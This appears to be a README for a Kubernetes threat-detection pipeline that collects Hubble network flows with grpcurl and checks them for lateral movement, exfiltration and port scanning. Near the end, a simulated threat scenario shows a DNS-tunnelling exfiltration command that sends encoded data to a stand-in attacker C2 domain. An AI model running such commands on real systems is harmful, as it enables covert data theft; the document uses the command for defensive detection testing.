# Hubble Flow Collection Setup

The threat analysis pipeline uses Hubble to collect network flows for empirical threat detection (lateral movement, data exfiltration, etc.).

## Prerequisites

### 1. Install grpcurl

Hubble flow collection requires `grpcurl` to communicate with the Hubble API.

**Option A: Download pre-built binary (recommended)**
```bash
# Download and install grpcurl
cd /tmp
wget https://github.com/fullstorydev/grpcurl/releases/download/v1.9.1/grpcurl_1.9.1_linux_amd64.tar.gz
tar -xzf grpcurl_1.9.1_linux_amd64.tar.gz
sudo mv grpcurl /usr/local/bin/
chmod +x /usr/local/bin/grpcurl

# Verify installation
grpcurl --version
```

**Option B: Install via Go**
```bash
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
```

**Option C: Install via package manager (Ubuntu/Debian)**
```bash
# Add repository
wget https://github.com/fullstorydev/grpcurl/releases/download/v1.9.1/grpcurl_1.9.1_linux_amd64.deb
sudo dpkg -i grpcurl_1.9.1_linux_amd64.deb
```

### 2. Verify Hubble Relay is Running

```bash
kubectl get pods -n kube-system | grep hubble-relay
# Should show: hubble-relay-xxxxx   1/1     Running
```

## How It Works

When you run `./run_analysis.sh --deploy-threats`, the pipeline:

1. **Starts Hubble collector** (`tools/hubble_collector.sh start`)
   - Creates a kubectl port-forward to `hubble-relay` service
   - Uses grpcurl to stream flows continuously
   - Writes flows to `output/hubble_flows.jsonl`

2. **Deploys threat scenarios** (90-150 second wait time)
   - Threats execute malicious behaviors
   - Hubble captures all network activity

3. **Collects flows** - The analysis reads from `output/hubble_flows.jsonl`
   - Default: Last 50,000 flows (most recent)
   - Can be increased in `k8s_extractor/hubble_fetcher.py`

4. **Stops collector** - Automatically cleaned up via trap

## Troubleshooting

### No flows collected (file is empty)

**Check logs:**
```bash
cat output/hubble_collector.log
```

**Common issues:**
- `grpcurl: command not found` → Install grpcurl (see above)
- `connection refused` → Verify hubble-relay is running
- `timeout` → Increase wait time: `./run_analysis.sh --deploy-threats --wait-time 180`

### Increase flow limit

Edit `k8s_extractor/hubble_fetcher.py`:
```python
def fetch_hubble_flows_from_file(file_path="output/hubble_flows.jsonl", max_flows=50000):
```

Change `max_flows=50000` to a higher value (or `None` for all flows).

### Manual flow collection

```bash
# Start collector
./tools/hubble_collector.sh output/hubble_flows.jsonl output/hubble_collector.log start

# Check status
./tools/hubble_collector.sh output/hubble_flows.jsonl output/hubble_collector.log status

# Stop collector
./tools/hubble_collector.sh output/hubble_flows.jsonl output/hubble_collector.log stop
```

## What Hubble Detects

The empirical threat detectors analyze Hubble flows for:

1. **Lateral Movement** (`k8s_threat_model/lateral_movement_detector.py`)
   - Cross-namespace communication
   - Development → Production access
   - Cross-namespace database connections

2. **Data Exfiltration** (`k8s_threat_model/lateral_movement_detector.py`)
   - External connections to suspicious IPs/ports
   - High-frequency egress traffic
   - DNS tunneling patterns (via DNS queries to attacker domains)

3. **Port Scanning** (`k8s_threat_model/port_scanner.py`)
   - Multiple connection attempts to different ports
   - Failed connections indicating reconnaissance

## Example: Data Exfiltration Detection

The `data_exfiltration` threat scenario performs DNS tunneling:

```bash
# Threat encodes data in DNS queries
nslookup ewogICJjdXN0b21lcnMi...exfil-1.attacker-c2-server.com 8.8.8.8
```

Hubble captures these flows as:
```json
{
  "flow": {
    "source": {"podName": "database-deployment-xxx"},
    "destination": {"ip": "8.8.8.8", "labels": ["reserved:world"]},
    "l4": {"UDP": {"destinationPort": 53}}
  }
}
```

The lateral movement detector (`detect_unusual_external_connections()`) flags this as suspicious egress traffic.
